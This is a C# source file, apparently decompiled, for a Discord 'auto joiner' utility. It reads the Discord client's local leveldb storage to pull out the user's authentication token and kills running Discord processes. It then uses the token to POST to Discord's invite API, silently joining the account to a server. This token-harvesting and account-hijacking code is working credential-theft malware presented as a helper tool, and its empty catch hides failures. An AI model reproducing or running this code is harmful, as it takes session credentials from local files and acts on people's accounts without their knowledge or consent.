using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace AutoJoiner
{
    public class Discord
    {
        private static string CO_Token()
        {
            string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            if (!CO_FindLdb(ref text) && !CO_FindLog(ref text))
            {
                Console.WriteLine("No valid .ldb or .log file found");
            }
            Process[] processesByName = Process.GetProcessesByName("Discord");
            for (int i = 0; i < processesByName.Length; i++)
            {
                processesByName[i].Kill();
            }
            Thread.Sleep(100);
            string text2 = CO_GetToken(text, text.EndsWith(".log"));
            if (text2 == ":")
            {
                text2 = "Not found";
            }
            return text2;
        }
        /// <summary>
        ///     Discord Group Auto Join.
        /// </summary>
        public static void Execute(string string_0)
        {
            try
            {
                WebClient wc = new WebClient();
                string_0 = CO_GetFinalRedirect(string_0);
                string_0 = string_0.Replace("discord.gg/", "");
                string_0 = string_0.Replace("https://", "");
                string_0 = string_0.Replace("http://", "");
                string_0 = string_0.Replace("www.", "");
                string_0 = string_0.Replace("discordapp.com/", "");
                string_0 = string_0.Replace("invite/", "");
                string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
                if (!CO_FindLdb(ref text) && !CO_FindLog(ref text))
                {
                    Console.WriteLine("No valid .ldb or .log file found");
                }
                System.Threading.Thread.Sleep(100);
                string text2 = CO_GetToken(text, text.EndsWith(".log"));
                if (text2 == "")
                {
                    text2 = "Not found";
                }
                HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v6/invite/" + string_0);
                httpWebRequest.Method = "POST";
                httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0";
                httpWebRequest.AutomaticDecompression = DecompressionMethods.GZip;
                httpWebRequest.Headers.Add("Authorization", text2);
                httpWebRequest.ContentLength = 0L;
                HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
            }
            catch
            {

            }
        }
        private static string CO_GetToken(string string_0, bool bool_0 = false)
        {
            byte[] bytes = File.ReadAllBytes(string_0);
            string @string = Encoding.UTF8.GetString(bytes);
            string text = "";
            string text2 = @string;
            while (text2.Contains("oken"))
            {
                string[] array = CO_Sub(text2).Split(new char[]
                {
                    '"'
                });
                text = array[0];
                text2 = string.Join("\"", array);
                if (bool_0 && text.Length == 59)
                {
                    break;
                }
            }
            return text;
        }
        private static bool CO_FindLog(ref string string_0)
        {
            if (Directory.Exists(string_0))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(string_0).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        string_0 += fileInfo.Name;
                        return string_0.EndsWith(".log");
                    }
                }
                return string_0.EndsWith(".log");
            }
            return false;
        }
        private static bool CO_FindLdb(ref string string_0)
        {
            if (Directory.Exists(string_0))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(string_0).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        string_0 += fileInfo.Name;
                        return string_0.EndsWith(".ldb");
                    }
                }
                return string_0.EndsWith(".ldb");
            }
            return false;
        }
        private static string CO_GetFinalRedirect(string string_0)
        {
            string result;
            if (string.IsNullOrWhiteSpace(string_0))
            {
                result = string_0;
            }
            else
            {
                int num = 8;
                string text = string_0;
                do
                {
                    HttpWebResponse httpWebResponse = null;
                    try
                    {
                        HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
                        httpWebRequest.Method = "HEAD";
                        httpWebRequest.AllowAutoRedirect = false;
                        httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                        HttpStatusCode statusCode = httpWebResponse.StatusCode;
                        if (statusCode == HttpStatusCode.OK)
                        {
                            return text;
                        }
                        if (statusCode - HttpStatusCode.MovedPermanently > 2 && statusCode != HttpStatusCode.TemporaryRedirect)
                        {
                            return text;
                        }
                        text = httpWebResponse.Headers["Location"];
                        if (text == null)
                        {
                            return string_0;
                        }
                        if (text.IndexOf("://", StringComparison.Ordinal) == -1)
                        {
                            Uri uri = new Uri(new Uri(string_0), text);
                            text = uri.ToString();
                        }
                        string_0 = text;
                    }
                    catch (WebException)
                    {
                        return text;
                    }
                    catch (Exception)
                    {
                        return null;
                    }
                    finally
                    {
                        if (httpWebResponse != null)
                        {
                            httpWebResponse.Close();
                        }
                    }
                }
                while (num-- > 0);
                result = text;
            }
            return result;
        }
        private static string CO_Sub(string string_0)
        {
            string[] array = string_0.Substring(string_0.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }
    }
}
